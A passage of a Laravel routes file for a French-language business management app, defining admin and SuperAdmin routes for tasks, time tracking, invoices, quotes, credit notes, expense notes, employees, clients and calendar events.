    Route::get('tasks/tasks-info/{startDate}/{employee_id}', [EmployeestasksController::class, 'getTasksInfo'])->name('tasks.info-employee');
    Route::get('tasks/tasks-info-interval/{startDate}/{endDate}/{employee_id}', [EmployeestasksController::class, 'getTasksInfoInterval'])->name('tasks.info-interval');
    Route::get('tasks/get-project-name/{taskName}', [TasksController::class, 'getProjectName']);
    Route::get('tasks/get-employee-name/{employeeId}', [TasksController::class, 'getEmployeeName']);

    Route::resource('/tasks', EmployeestasksController::class)->except(['show', 'create', 'store']);
    Route::post('/tasks/{task}/status/{status}', [EmployeestasksController::class, "status"])->name('tasks.status');
    Route::get('/tasks/pointage', [EmployeestasksController::class, 'pointage'])->name('tasks.pointage');

    Route::resource('/teams', EmployeesteamsController::class);

    Route::get('/todoliste/create', [todolisteController::class, 'create'])->name('todoliste.create');
    Route::post('/todoliste/store', [todolisteController::class, 'store'])->name('todoliste.store');
    Route::delete('/todoliste/destroy', [todolisteController::class, 'destroy'])->name('todoliste.destroy');

    Route::get('tasks/tasks-info-interval-employee/{startDate}/{endDate}/{employee}', [TasksController::class, 'getTasksInfoIntervalEmployee'])->name('tasks.interval-info-employee');

    Route::post('/tasks/update-duration/{task}', [TasksController::class, "updateDuration"])->name('tasks.updateDuration-task');

    Route::get('/Pointagerepports/downloadRepports/{startDate}/{endDate}/{employeeID}', [EmployeestasksController::class, 'downloadPointageRepports'])->name('Pointagerepports.downloadRepports-employee');
    Route::get('/Pointagerepports/downloadOneDayRepports/{startDate}/{employeeID}', [EmployeestasksController::class, 'downloadOneDayRepports'])->name('Pointagerepports.downloadOneDayRepports-employee');

    Route::get('/tasks/board', [tasksController::class, "board"])->name('tasks.board');
    Route::resource('/tasks', tasksController::class)->except(['create', 'store']);
    Route::post('/tasks/{task}/status/{status}', [tasksController::class, "status"])->name('tasks.status');
    Route::get('/tasks/create/{project_id?}', [tasksController::class, "create"])->name('tasks.create');
    Route::post('/tasks/move-task', [tasksController::class, "moveTask"])->name('tasks.moveTask');
    Route::post('/tasks/store/{project_id}', [tasksController::class, "store"])->name('tasks.store');
    Route::get('/Tasksrepports/downloadRepports', [tasksController::class, 'downloadTasksRepports'])->name('Tasksrepports.downloadRepports');

    Route::post('workdaysrepports/updateWorkdaysRepport', [employeesController::class, 'updateWorkdaysRepport'])->name('workdaysrepports.updateWorkdaysRepport');
    Route::get('/workDaysReports/index', [employeesController::class, "workDaysReportsIndex"])->name('workDaysReports.index');
    Route::get('/workDaysReports/filter-reports', [employeesController::class, 'filterReports'])->name('workDaysReports.filterReports');
    Route::get('/workDaysReports/downloadRepports', [employeesController::class, 'downloadworkDaysRepports'])->name('workDaysReports.downloadRepports');
    Route::post('/workDaysReports/nextMonthRepports', [employeesController::class, 'nextMonthRepports'])->name('workDaysReports.nextMonthRepports');


    Route::resource('/roles', RoleController::class)->except(['create', 'store'])->where(['role' => '[0-9]+']);
    Route::post('/roles/{role}/assign_permission', [RoleController::class, "assign_permission"])->name("roles.assign_permission");
    Route::post('admin/roles/{role}/delete_permission', [RoleController::class, "delete_permission"])->name('roles.delete_permission');
    Route::resource('/permissions', PermissionController::class);
    Route::resource('/employees', employeesController::class)->except(['destroy']);
    Route::delete('/employees/{employee}/destroy', [employeesController::class, "destroy"])->name('employees.destroy');
    Route::post('/employees/{employee}/assign_roles', [employeesController::class, "assign_roles"])->name("employees.assign_roles");
    Route::post('/employee/{employee}/desactivate', [employeesController::class, "desactivate"])->name("employee.deactivate");
    Route::post('/employee/{employee}/activate', [employeesController::class, "activate"])->name("employee.activate");
    Route::resource('/clients', clientsController::class);
    Route::delete('/clients/{client}/destroy', [clientsController::class, "destroy"])->name('client.destroy');

    Route::put('/clients/{client}/addContact', [clientsController::class, 'addContact'])->name('clients.addContact');

    Route::resource('/tasks', tasksController::class)->except(['create', 'store']);
    Route::post('/tasks/{task}/status/{status}', [tasksController::class, "status"])->name('tasks.status');
    Route::get('/tasks/create/{project_id?}', [tasksController::class, "create"])->name('tasks.create');
    Route::post('/tasks/move-task', [tasksController::class, "moveTask"])->name('tasks.moveTask');
    Route::post('/tasks/store/{project_id}', [tasksController::class, "store"])->name('tasks.store');
    Route::resource('/teams', teamsController::class);
    Route::get('/projects/create/{client_id?}', [projectController::class, "create"])->name('projects.create');
    Route::post('/projects/store/{client_id?}', [projectController::class, "store"])->name('projects.store');
    Route::get('projects/report', [ProjectController::class, 'projectReport'])->name('projects.report');
    Route::resource('/projects', projectController::class)->except(['create', 'store']);
    Route::post('/projects/{project}/status/{status}', [projectController::class, "status"])->name('projects.status');
    Route::post('projects/updateProject', [projectController::class, 'updateProject'])->name('projects.updateProject');

    Route::resource('/todoliste', todolisteController::class)->except(['show', 'update', 'destroy', 'store']);

    //Route::get('/todoliste/create', [todolisteController::class,'create'])->name('todoliste.create');
    //Route::post('/todoliste/store', [todolisteController::class,'store'])->name('todoliste.store');
    //Route::get('/todoliste/edit/{$id}', [todolisteController::class,'edit'])->name('todoliste.edit');
    Route::post('/todoliste/update/{id}', [todolisteController::class, 'update'])->name('todoliste.update');
    Route::delete('/todoliste/destroy', [todolisteController::class, 'destroy'])->name('todoliste.destroy');
    Route::delete('/todoliste/deleteItem/{id}', [todolisteController::class, 'deleteItem'])->name('todoliste.deleteItem');
    Route::post('/todoliste/updatestatus/{todoliste}', [todolisteController::class, 'updateStatus'])->name('todoliste.updateStatus');

    Route::get('/tasks/pointage', [tasksController::class, 'pointage'])->name('tasks.pointage');
    Route::get('tasks/tasks-info/{startDate}', [TasksController::class, 'getTasksInfo'])->name('tasks.info');
    Route::get('tasks/tasks-info-interval/{startDate}/{endDate}', [TasksController::class, 'getTasksInfoInterval'])->name('tasks.interval-info');
    Route::get('tasks/get-project-name/{taskName}', [TasksController::class, 'getProjectName']);
    Route::get('tasks/get-employee-name/{employeeId}', [TasksController::class, 'getEmployeeName']);

    Route::post('/tasks/{task}/start/{employee_id}', [tasksController::class, 'start'])->name('employee.tasks.start');
    Route::post('/tasks/{task}/stop/{employee_id}', [tasksController::class, 'stop'])->name('employee.tasks.stop');

    Route::post('/tasks/{task}/pause/{employee_id}', [tasksController::class, 'pause'])->name('employees.tasks.pause');
    Route::post('/tasks/{task}/resume/{employee_id}', [tasksController::class, 'resume'])->name('employees.tasks.resume');

    Route::resource('/Enterprise_infos', AdminEntrepriseController::class)->except(['show']);
    Route::post('Enterprise_Billings/updateBillings', [AdminEntrepriseController::class, "updateBillings"])->name('Enterprise_Billings.updateBillings');
    Route::post('Enterprise_infos/updateInfos', [AdminEntrepriseController::class, "updateInfos"])->name('Enterprise_infos.updateInfos');
    Route::post('Enterprise_SMTPinfos/updateSMTPInfos', [AdminEntrepriseController::class, "updateSMTPInfos"])->name('Enterprise_SMTPinfos.updateSMTPInfos');
    Route::post('entreprise/validate/{chargeid}/{budget_id}', [AdminEntrepriseController::class, 'validateBilling'])->name('entreprise.validateBilling');
    Route::post('entreprise/unvalidate/{chargeid}/{budget_id}', [AdminEntrepriseController::class, 'unvalidateBilling'])->name('entreprise.unvalidateBilling');
    Route::post('entreprise/addBudget', [AdminEntrepriseController::class, 'addBudget'])->name('entreprise.addBudget');
    Route::get('/entrepriseBillings/downloadRepports', [AdminEntrepriseController::class, 'downloadBillingsRepports'])->name('entrepriseBillings.downloadRepports');


    Route::post('clients/updateClient', [clientsController::class, 'updateClient'])->name('clients.updateClient');
    Route::post('clients/updateContact', [clientsController::class, 'updateContact'])->name('clients.updateContact');

    Route::post('employees/updateEmployee', [employeesController::class, 'updateEmployee'])->name('employees.updateEmployee');

    Route::get('/projects/invoice/{id}', [ProjectController::class, 'invoice'])->name('projects.invoice');
    Route::get('/projects/invoicebyduration/{name}/{duration}/{cost}', [projectController::class, "invoicebyduration"])->name('projects.invoicebyduration');
    Route::get('/invoices/fullinvoice', [projectController::class, "fullinvoice"])->name('invoices.fullinvoice');
    Route::get('/projects/invoicebyduration2/{id}/{startdate}/{enddate}', [projectController::class, "invoicebyduration2"])->name('projects.invoicebyduration2');

    Route::get('/invoices/invoicehistory', [projectController::class, "invoicehistory"])->name('invoices.invoicehistory');
    Route::delete('/invoice/{invoice}/destroy', [projectController::class, "destroyInvoice"])->name('invoice.destroy');

    Route::post('/invoice/{invoice}/desactivate', [projectController::class, "desactivate"])->name("invoice.deactivate");
    Route::post('/invoice/{invoice}/activate', [projectController::class, "activate"])->name("invoice.activate");

    Route::get('/invoice/downloadPartial/{invoiceNumber}', [projectController::class, "downloadPeriodInvoice"])->name("invoice.downloadPartial");
    Route::get('/invoice/downloadFull/{invoiceNumber}', [projectController::class, "downloadFullInvoice"])->name("invoice.downloadFull");

    Route::post('/invoice/remind', [projectController::class, "sendemailreminder"])->name('invoice.remind');

    Route::get('/invoice/Manualremind/{id}/{reminder}', [projectController::class, "sendManualReminder"])->name('invoice.sendManualremind');

    Route::post('/invoice/SendInvReminder/{invoice_id}/{reminder_number}', [projectController::class, "SendInvReminder"])->name('invoice.SendInvReminder');

    Route::get('/get-contacts/{clientId}', [projectController::class, "getContacts"]);
    Route::post('/send-invoice/{invoice_id}', [projectController::class, 'sendInvoice'])->name('invoice.sendInvoice');

    Route::get('/devis/generateDevis', [projectController::class, "generateDevis"])->name('devis.generateDevis');
    Route::post('/devis/sendDevis', [projectController::class, "sendDevis"])->name('devis.sendDevis');
    Route::post('/devis/saveDevisPdf', [projectController::class, "saveDevisPdf"])->name('devis.saveDevisPdf');

    Route::get('/devis/devishistory', [projectController::class, "devishistory"])->name('devis.devishistory');
    Route::delete('/devis/{devis}/destroy', [projectController::class, "destroydevis"])->name('devis.destroy');
    Route::get('/devis/downloadDevis/{id}', [projectController::class, "downloadDevis"])->name("devis.downloadDevis");

    Route::post('/devis/{devis}/acceptDevis', [projectController::class, "acceptDevis"])->name("devis.acceptDevis");
    Route::post('/devis/{devis}/declineDevis', [projectController::class, "declineDevis"])->name("devis.declineDevis");

    Route::get('/pointage/index', [tasksController::class, 'Markpointage'])->name('pointage.index');

    Route::post('/pointage/{tasks}/{employee_id}/start', [tasksController::class, "start"])->name('tasks.start');
    Route::post('/pointage/{tasks}/{employee_id}/stop', [tasksController::class, "stop"])->name('tasks.stop');
    Route::post('/pointage/{tasks}/{employee_id}/pause', [tasksController::class, 'pause'])->name('tasks.pause');
    Route::post('/pointage/{tasks}/{employee_id}/resume', [tasksController::class, 'resume'])->name('tasks.resume');

    Route::get('/invoices/pdf/{invoiceName}', [projectController::class, "servePdf"])->name('invoices.servePdf');

    Route::get('/invoices/parameters', [projectController::class, "parameters"])->name('invoices.parameters');
    Route::get('/devis/parameters', [projectController::class, "devisparameters"])->name('devis.parameters');

    Route::post('pointage/fetch-duration', [tasksController::class, 'fetchDuration'])->name('fetch.duration');

    Route::post('/tasks/update-duration/{task_id}', [tasksController::class, "updateDuration"])->name('tasks.updateDuration');

    Route::post('/entreprise/updateImage', [AdminEntrepriseController::class, "updateImage"])->name('entreprise.updateImage');

    Route::delete('/clients/destroyContact/{contact_id}', [clientsController::class, "destroyContact"])->name('clients.destroyContact');

    Route::get('/Clientrepports/downloadRepports', [clientsController::class, 'downloadClinetsRepports'])->name('Clientrepports.downloadRepports');
    Route::get('/Employeesrepports/downloadRepports', [employeesController::class, 'downloadEmployeesRepports'])->name('Employeesrepports.downloadRepports');
    Route::get('/Projectsrepports/downloadRepports', [projectController::class, 'downloadProjectsRepports'])->name('Projectsrepports.downloadRepports');
    Route::get('/Tasksrepports/downloadRepports', [tasksController::class, 'downloadTasksRepports'])->name('Tasksrepports.downloadRepports');

    Route::get('/Pointagerepports/downloadRepports/{startDate}/{endDate}', [tasksController::class, 'downloadPointageRepports'])->name('Pointagerepports.downloadRepports');
    Route::get('/Pointagerepports/downloadOneDayRepports/{startDate}', [tasksController::class, 'downloadOneDayRepports'])->name('Pointagerepports.downloadOneDayRepports');

    Route::get('/CustomerPointagerepports/CustomerdownloadRepports/{startDate}/{endDate}', [tasksController::class, 'CustomerdownloadPointageRepports'])->name('CustomerPointagerepports.CustomerdownloadRepports');
    Route::get('/CustomerPointagerepports/CustomerdownloadOneDayRepports/{startDate}', [tasksController::class, 'CustomerdownloadOneDayRepports'])->name('Pointagerepports.CustomerdownloadOneDayRepports');

    Route::get('/Teamssrepports/downloadRepports', [teamsController::class, 'downloadTeamsRepports'])->name('Teamssrepports.downloadRepports');

    Route::get('/Invoicessrepports/downloadRepports', [projectController::class, 'downloadInvoicesRepports'])->name('Invoicessrepports.downloadRepports');

    Route::get('/Devissrepports/downloadRepports', [projectController::class, 'downloadDevisRepports'])->name('Devissrepports.downloadRepports');

    Route::get('/invoice/creditNote/{id}', [projectController::class, "generateCreditNote"])->name('invoice.creditNote');

    Route::get('/invoice/creditNoteHistory', [projectController::class, "creditNoteHistory"])->name('invoice.creditNoteHistory');

    Route::get('/invoices/serveCreditNotePdf/{credit_note_number}', [projectController::class, "serveCreditNotePdf"])->name('invoices.serveCreditNotePdf');

    Route::get('/creditNote/downloadRepports', [projectController::class, 'downloadcreditNoteRepports'])->name('creditNote.downloadRepports');

    Route::delete('/credit_note/{credit_note}/destroy', [projectController::class, "destroyCreditNote"])->name('credit_note.destroy');

    Route::get('/creditNote/creditNoteHistory', [projectController::class, "creditNoteHistory"])->name('creditNote.creditNoteHistory');

    // Detailed Credit Note Routes
    Route::get('/invoice/detailedCreditNote/{id}', [projectController::class, "createDetailedCreditNote"])->name('invoice.detailedCreditNote');
    Route::post('/invoices/confirmDetailedCreditNote/{invoiceID}', [projectController::class, "confirmDetailedCreditNote"])->name('invoices.confirmDetailedCreditNote');

    Route::post('workdaysrepports/updateWorkdaysRepport', [employeesController::class, 'updateWorkdaysRepport'])->name('workdaysrepports.updateWorkdaysRepport');

    Route::get('/workDaysReports/index', [employeesController::class, "workDaysReportsIndex"])->name('workDaysReports.index');

    Route::get('/workDaysReports/filter-reports', [employeesController::class, 'filterReports'])->name('workDaysReports.filterReports');

    Route::get('/workDaysReports/downloadRepports', [employeesController::class, 'downloadworkDaysRepports'])->name('workDaysReports.downloadRepports');

    Route::post('/workDaysReports/nextMonthRepports', [employeesController::class, 'nextMonthRepports'])->name('workDaysReports.nextMonthRepports');

    // New routes for PDF preview and emailing
    Route::get('/workDaysReports/pdf', [employeesController::class, 'generatePdfForPreview'])->name('workDaysReports.pdf');
    Route::post('/workDaysReports/sendEmail', [employeesController::class, 'sendWorkdaysReportEmail'])->name('workDaysReports.sendEmail');

    Route::get('/notedefrais/generateNoteDeFrais', [projectController::class, "generateNoteDeFrais"])->name('notedefrais.generateNoteDeFrais');
    Route::post('/notedefrais/savePdf', [projectController::class, "saveNoteDeFraisPdf"])->name('notedefrais.saveNoteDeFraisPdf');
    Route::get('/notedefrais/parameters', [projectController::class, "notedefraisparameters"])->name('notedefrais.parameters');
    Route::get('/notedefrais/downloadNoteDeFrais/{id}', [projectController::class, "downloadNoteDeFrais"])->name("notedefrais.downloadNoteDeFrais");
    Route::get('/notedefrais/notedefraishistory', [projectController::class, "notedefraishistory"])->name('notedefrais.notedefraishistory');
    Route::delete('/notedefrais/{notedefrais}/destroy', [projectController::class, "destroyNotedeFrais"])->name('notedefrais.destroy');
    Route::get('/notedefrais/downloadRepports', [projectController::class, 'downloadNoteDeFraisRepports'])->name('notedefrais.downloadRepports');

    Route::get('filter/employees/{employeeId}/projects', [ProjectController::class, 'getEmployeeProjects'])->name('filter.getEmployeeProjects');
    Route::get('filter/employees/{employeeId}/tasks', [ProjectController::class, 'getEmployeeTasks'])->name('filter.getEmployeeTasks');
    Route::get('filter/projects/{projectId}/tasks', [ProjectController::class, 'getProjectTasks'])->name('filter.getProjectTasks');
    Route::get('filter/tasks/{taskId}', [ProjectController::class, 'getTaskInfo'])->name('filter.getTaskInfo');
    Route::get('filter/projects', [ProjectController::class, 'getAllProjects'])->name('filter.getAllProjects');
    Route::get('filter/tasks', [ProjectController::class, 'getAllTasks'])->name('filter.getAllTasks');

    Route::get('/projects/partialInvoice/{projectid}/{amount}', [projectController::class, "PartialInvoice"])->name('projects.PartialInvoice');
    Route::get('/projects/percentageInvoice/{projectid}/{percentage}', [projectController::class, "PercentageInvoice"])->name('projects.PercentageInvoice');

    Route::post('/projects/confirm-full-invoice/{projectID}/{budget}/{comment?}', [ProjectController::class, 'confirmFullInvoice'])->name('projects.confirmFullInvoice');

    Route::post('/projects/confirm-period-invoice/{projectID}/{startdate}/{enddate}/{comment?}', [ProjectController::class, 'confirmPeriodInvoice'])->name('projects.confirmPeriodInvoice');
    Route::post('/projects/confirm-percentage-invoice/{projectID}/{percentage}/{comment?}', [ProjectController::class, 'confirmPercentageInvoice'])->name('projects.confirmPercentageInvoice');
    Route::post('/projects/confirm-partial-invoice/{projectID}/{amount}/{comment?}', [ProjectController::class, 'confirmPartialInvoice'])->name('projects.confirmPartialInvoice');

    Route::post('/projects/decline-Invoice', [ProjectController::class, 'declineInvoice'])->name('projects.declineInvoice');

    Route::post('/projects/archive/{project_id}', [ProjectController::class, "archiveProject"])->name('projects.archive');
    Route::post('/projects/unarchive/{project_id}', [ProjectController::class, "unarchiveProject"])->name('projects.unarchive');
    Route::get('projectsArchived/archive', [ProjectController::class, 'projectArchiveIndex'])->name('projectsArchived.archiveIndex');

    Route::post('/devis/archive/{devis_id}', [ProjectController::class, "archiveDevis"])->name('devis.archive');
    Route::post('/devis/unarchive/{devis_id}', [ProjectController::class, "unarchiveDevis"])->name('devis.unarchive');
    Route::get('devisArchived/archive', [ProjectController::class, 'devisArchiveIndex'])->name('devisArchived.archiveIndex');

    Route::post('creditNote/confirm/{id}/{noteType}/{noteAmount}', [ProjectController::class, 'ConfirmCreditNote'])->name('creditNote.confirm');

    Route::post('/confirm-frais-note', [ProjectController::class, 'confirmFraisNote'])->name('notedefrais.confirmFraisNote');

    Route::post('/projects/updateInfos/{id}/{client_id?}', [ProjectController::class, 'update'])->name('projects.updateInfos');

    Route::get('/tasks/{employee}/durationInfos/{task}', [tasksController::class, 'durationInfos'])->name('tasks.durationInfos');

    Route::post('/devis/saveDuplicateDevis', [projectController::class, "saveDuplicateDevis"])->name('devis.saveDuplicateDevis');
    Route::get('/devis/duplicateDevis/{devis_id}', [projectController::class, "duplicateDevis"])->name('devis.duplicateDevis');

    Route::get('/pointage/filterPointageByDate', [tasksController::class, 'filterPointageByDate'])->name('pointage.filterPointageByDate');

    Route::get('/pointage/get-timer-state', [tasksController::class, 'get_timer_state'])->name('pointage.get_timer_state');

    Route::get('/pointage/filter-table', [tasksController::class, 'filterPointageTable'])->name('pointage.filterPointageTable');

    Route::get('invoiceArchived/archive', [ProjectController::class, 'invoiceArchiveIndex'])->name('invoiceArchived.archiveIndex');

    Route::delete('/billing/destroy/{id}', [AdminEntrepriseController::class, 'destroyBillings'])->name('billing.destroy');
    Route::post('/budget/update/{id}', [AdminEntrepriseController::class, 'updateCharge'])->name('budget.updateCharge');

    Route::get('/calendar', [CalendarController::class, 'index'])->name('calendar.index');
    Route::get('/calendar/events', [CalendarController::class, 'getEvents'])->name('calendar.events');
    Route::post('/calendar/events', [CalendarController::class, 'store'])->name('calendar.store');
    Route::put('/calendar/events/{id}', [CalendarController::class, 'update'])->name('calendar.update');
    Route::delete('/calendar/events/{id}', [CalendarController::class, 'destroy'])->name('calendar.destroy');
    Route::patch('/calendar/events/{id}/dates', [CalendarController::class, 'updateDates'])->name('calendar.updateDates');

    Route::get('/calendar/daily-events', [CalendarController::class, 'getDailyEvents'])->name('calendar.dailyEvents');
    Route::get('/calendar/events/current-month', [CalendarController::class, 'getCurrentMonthEvents'])->name('calendar.currentMonthEvents');
    Route::get('/calendar/send-events/preview', [CalendarController::class, 'previewSendEvents'])->name('calendar.send-events.preview');
    Route::get('/calendar/events/pdf', [CalendarController::class, 'generateEventsPDF'])->name('calendar.events.pdf');
    Route::post('/calendar/send-events-email', [CalendarController::class, 'sendEventsEmail'])->name('calendar.send-events-email');

    // Edit Full Invoice routes
    Route::get('/invoices/edit/{id}', [ProjectController::class, 'editFullInvoice'])->name('invoices.editFullInvoice');
    Route::put('/invoices/update/{id}', [ProjectController::class, 'updateFullInvoice'])->name('invoices.updateFullInvoice');

    // Edit Partial Invoice routes
    Route::get('/invoices/partial/edit/{id}', [ProjectController::class, 'editPartialInvoice'])->name('invoices.editPartialInvoice');
    Route::put('/invoices/partial/update/{id}', [ProjectController::class, 'updatePartialInvoice'])->name('invoices.updatePartialInvoice');

    // Edit Percentage Invoice routes
    Route::get('/invoices/percentage/edit/{id}', [ProjectController::class, 'editPercentageInvoice'])->name('invoices.editPercentageInvoice');
    Route::put('/invoices/percentage/update/{id}', [ProjectController::class, 'updatePercentageInvoice'])->name('invoices.updatePercentageInvoice');

    // Edit Period Invoice routes
    Route::get('/invoices/period/edit/{id}', [ProjectController::class, 'editPeriodInvoice'])->name('invoices.editPeriodInvoice');
    Route::put('/invoices/period/update/{id}', [ProjectController::class, 'updatePeriodInvoice'])->name('invoices.updatePeriodInvoice');

    Route::get('/devis/edit/{id}', [projectController::class, 'editDevis'])->name('devis.editDevis');
    Route::put('/devis/update/{id}', [projectController::class, 'updateDevis'])->name('devis.updateDevis');

    Route::post('/projects/{project}/upload-file', [ProjectController::class, 'uploadProjectFile'])->name('projects.uploadFile');
    Route::get('/projects/downloadfiles/{file_name}', [ProjectController::class, 'downloadfiles'])->name('projects.downloadfiles');
    Route::delete('/projects/deletefiles/{file_name}', [ProjectController::class, 'deletefiles'])->name('projects.deletefiles');

    Route::post('/tasks/update-{field}/{id}', [tasksController::class, 'updateField'])->name('tasks.updateField');
    Route::get('/invoices/generate-detailed', [projectController::class, 'generateDetailedInvoice'])->name('invoices.generate.Detailed');
    Route::post('/invoices/detailed', [projectController::class, 'detailedInvoice'])->name('invoices.detailed');
    Route::post('/invoices/confirm-detailed/{projectID}', [projectController::class, 'confirmDetailedInvoice'])->name('invoices.confirmDetailedInvoice');

    Route::post('/employees/archive/{employee_id}', [employeesController::class, "archiveEmployee"])->name('employees.archive');
    Route::post('/employees/unarchive/{employee_id}', [employeesController::class, "unarchiveEmployee"])->name('employees.unarchive');
    Route::get('employeesArchived/archive', [employeesController::class, 'employeeArchiveIndex'])->name('employeesArchived.archiveIndex');

    Route::get('/invoices/editDetailedInvoice/{id}', [ProjectController::class, 'editDetailedInvoice'])->name('invoices.editDetailedInvoice');
    Route::post('/invoices/updateDetailedInvoice/{id}', [ProjectController::class, 'updateDetailedInvoice'])->name('invoices.updateDetailedInvoice');

    // Add this route within your admin group/middleware
    Route::get('/get-devis/{projectId}', [ProjectController::class, 'getDevisByProject'])->name('get.devis.by.project');
    Route::get('/get-devis-comment/{devisId}', [ProjectController::class, 'getDevisComment']);

    Route::get('/tasks/get-project-tasks/{project}', [TasksController::class, 'getProjectTasks']);
    Route::post('/tasks/move-duration', [TasksController::class, 'moveDuration']);
    Route::get('/employees/{employeeId}/projects', [TasksController::class, 'getEmployeeProjects']);
    Route::post('/clients/filterInvoices/{client}', [clientsController::class, 'filterInvoices'])->name('clients.filterInvoices');

    Route::get('/clients/downloadInvoicesRepports/{client}', [clientsController::class, 'downloadInvoicesRepports'])->name('clients.downloadInvoicesRepports');

    Route::get('/filter/all-projects', [TasksController::class, 'getAllProjects']);
    Route::get('/filter/all-tasks', [TasksController::class, 'getAllTasks']);

    Route::get('/filter-invoices', [adminController::class, 'filterInvoices'])->name('filter.invoices');

    Route::post('/credit_note/send/{credit_note_id}', [ProjectController::class, 'sendCreditNote'])->name('credit_note.send');

    Route::get('/filter/clients/{client}/projects', [tasksController::class, 'getClientProjects'])->name('filter.client.projects');

    Route::get('/invoice/{invoice}/recipients', [ProjectController::class, 'getRecipients']);

    Route::get('/Pointagerepports/downloadMultipleTasksRepports/{startDate}/{endDate}', [tasksController::class, 'downloadMultipleTasksRepports'])->name('Pointagerepports.downloadMultipleTasksRepports');

    // Customer Report Routes
    Route::get('/CustomerPointagerepports/preview/{startDate}/{endDate}', [tasksController::class, 'previewCustomerReport'])
        ->where(['startDate' => '\d{4}-\d{2}-\d{2}', 'endDate' => '\d{4}-\d{2}-\d{2}'])
        ->name('CustomerPointagerepports.preview');
    Route::get('/CustomerPointagerepports/previewOneDay/{startDate}', [tasksController::class, 'previewOneDayCustomerReport'])
        ->where(['startDate' => '\d{4}-\d{2}-\d{2}'])
        ->name('CustomerPointagerepports.previewOneDay');
    Route::get('/CustomerPointagerepports/pdf', [tasksController::class, 'streamCustomerReportPdf'])
        ->name('CustomerPointagerepports.pdf');
    Route::post('/CustomerPointagerepports/send', [tasksController::class, 'sendCustomerReport'])->name('CustomerPointagerepports.send');

    Route::post('/employees/send-email', [employeesController::class, 'sendEmail'])->name('employees.send-email');

    Route::get('/devis/get-contacts/{devisId}', [projectController::class, 'getDevisContacts'])->name('devis.getContacts');

        // Update comment on a task timer (owned by the authenticated employee)
        Route::patch('tasks/timers/{id}/comment', [\App\Http\Controllers\employees\tasksController::class, 'updateTimerComment'])->name('tasks.timers.updateComment');

});




Route::middleware(['auth', 'verified', 'role:SuperAdmin'])->name('SuperAdmin.')->prefix('SuperAdmin')->group(function () {
    Route::get("/", [adminController::class, "index"])->name("index");
    Route::resource('/roles', RoleController::class)->except(['create', 'store'])->where(['role' => '[0-9]+']);
    Route::post('/roles/{role}/assign_permission', [RoleController::class, "assign_permission"])->name("roles.assign_permission");
    Route::post('admin/roles/{role}/delete_permission', [RoleController::class, "delete_permission"])->name('roles.delete_permission');
    Route::resource('/permissions', PermissionController::class);
    Route::resource('/employees', employeesController::class)->except(['destroy']);
    Route::delete('/employees/{employee}/destroy', [employeesController::class, "destroy"])->name('employees.destroy');
    Route::post('/employees/{employee}/assign_roles', [employeesController::class, "assign_roles"])->name("employees.assign_roles");
    Route::post('/employee/{employee}/desactivate', [employeesController::class, "desactivate"])->name("employee.deactivate");
    Route::post('/employee/{employee}/activate', [employeesController::class, "activate"])->name("employee.activate");
    Route::resource('/clients', clientsController::class);
    Route::delete('/clients/{client}/destroy', [clientsController::class, "destroy"])->name('client.destroy');

    Route::put('/clients/{client}/addContact', [clientsController::class, 'addContact'])->name('clients.addContact');

    Route::get('/tasks/board', [tasksController::class, "board"])->name('tasks.board');
    Route::resource('/tasks', tasksController::class)->except(['create', 'store']);
    Route::post('/tasks/{task}/status/{status}', [tasksController::class, "status"])->name('tasks.status');
    Route::get('/tasks/create/{project_id?}', [tasksController::class, "create"])->name('tasks.create');
    Route::post('/tasks/move-task', [tasksController::class, "moveTask"])->name('tasks.moveTask');
    Route::post('/tasks/store/{project_id}', [tasksController::class, "store"])->name('tasks.store');
    Route::resource('/teams', teamsController::class);
    Route::get('/projects/create/{client_id?}', [projectController::class, "create"])->name('projects.create');
    Route::post('/projects/store/{client_id?}', [projectController::class, "store"])->name('projects.store');
    Route::get('projects/report', [ProjectController::class, 'projectReport'])->name('projects.report');
    Route::resource('/projects', projectController::class)->except(['create', 'store']);
    Route::post('/projects/{project}/status/{status}', [projectController::class, "status"])->name('projects.status');
    Route::post('projects/updateProject', [projectController::class, 'updateProject'])->name('projects.updateProject');


    Route::get('/billit-test', [BillitController::class, 'test'])->name('billit.test');
    Route::post('/billit/send-invoice/{id}', [BillitController::class, 'sendInvoiceHistoryBillit'])->name('billit.send-invoice');
    Route::post('/billit/send-invoice/{id}/{type}', [BillitController::class, 'sendInvoiceHistoryBillitByType'])->name('billit.send-invoice-type');
    Route::get('/billit/invoices/{type}', [BillitController::class, 'listInvoicesByType'])->name('billit.invoices-by-type');

     Route::delete('/tasks/timer/{id}', [tasksController::class, 'destroyTimer'])->name('tasks.timer.destroy');

    Route::resource('/todoliste', todolisteController::class)->except(['show', 'update', 'destroy']);

    //Route::get('/todoliste/create', [todolisteController::class,'create'])->name('todoliste.create');
    //Route::post('/todoliste/store', [todolisteController::class,'store'])->name('todoliste.store');
    //Route::get('/todoliste/edit/{$id}', [todolisteController::class,'edit'])->name('todoliste.edit');
    Route::post('/todoliste/update/{id}', [todolisteController::class, 'update'])->name('todoliste.update');
    Route::delete('/todoliste/destroy', [todolisteController::class, 'destroy'])->name('todoliste.destroy');
    Route::delete('/todoliste/deleteItem/{id}', [todolisteController::class, 'deleteItem'])->name('todoliste.deleteItem');
    Route::post('/todoliste/updatestatus/{todoliste}', [todolisteController::class, 'updateStatus'])->name('todoliste.updateStatus');

    Route::get('/tasks/pointage', [tasksController::class, 'pointage'])->name('tasks.pointage');
    Route::get('tasks/tasks-info/{startDate}', [TasksController::class, 'getTasksInfo'])->name('tasks.info');
    Route::get('tasks/tasks-info-interval/{startDate}/{endDate}', [TasksController::class, 'getTasksInfoInterval'])->name('tasks.interval-info');
    Route::get('tasks/get-project-name/{taskName}', [TasksController::class, 'getProjectName']);
    Route::get('tasks/get-employee-name/{employeeId}', [TasksController::class, 'getEmployeeName']);

    Route::post('/tasks/{task}/start/{employee_id}', [tasksController::class, 'start'])->name('employee.tasks.start');
    Route::post('/tasks/{task}/stop/{employee_id}', [tasksController::class, 'stop'])->name('employee.tasks.stop');

    Route::post('/tasks/{task}/pause/{employee_id}', [tasksController::class, 'pause'])->name('employees.tasks.pause');
    Route::post('/tasks/{task}/resume/{employee_id}', [tasksController::class, 'resume'])->name('employees.tasks.resume');

    Route::resource('/Enterprise_infos', AdminEntrepriseController::class)->except(['show']);
    Route::post('Enterprise_Billings/updateBillings', [AdminEntrepriseController::class, "updateBillings"])->name('Enterprise_Billings.updateBillings');
    Route::post('Enterprise_infos/updateInfos', [AdminEntrepriseController::class, "updateInfos"])->name('Enterprise_infos.updateInfos');
    Route::post('Enterprise_SMTPinfos/updateSMTPInfos', [AdminEntrepriseController::class, "updateSMTPInfos"])->name('Enterprise_SMTPinfos.updateSMTPInfos');
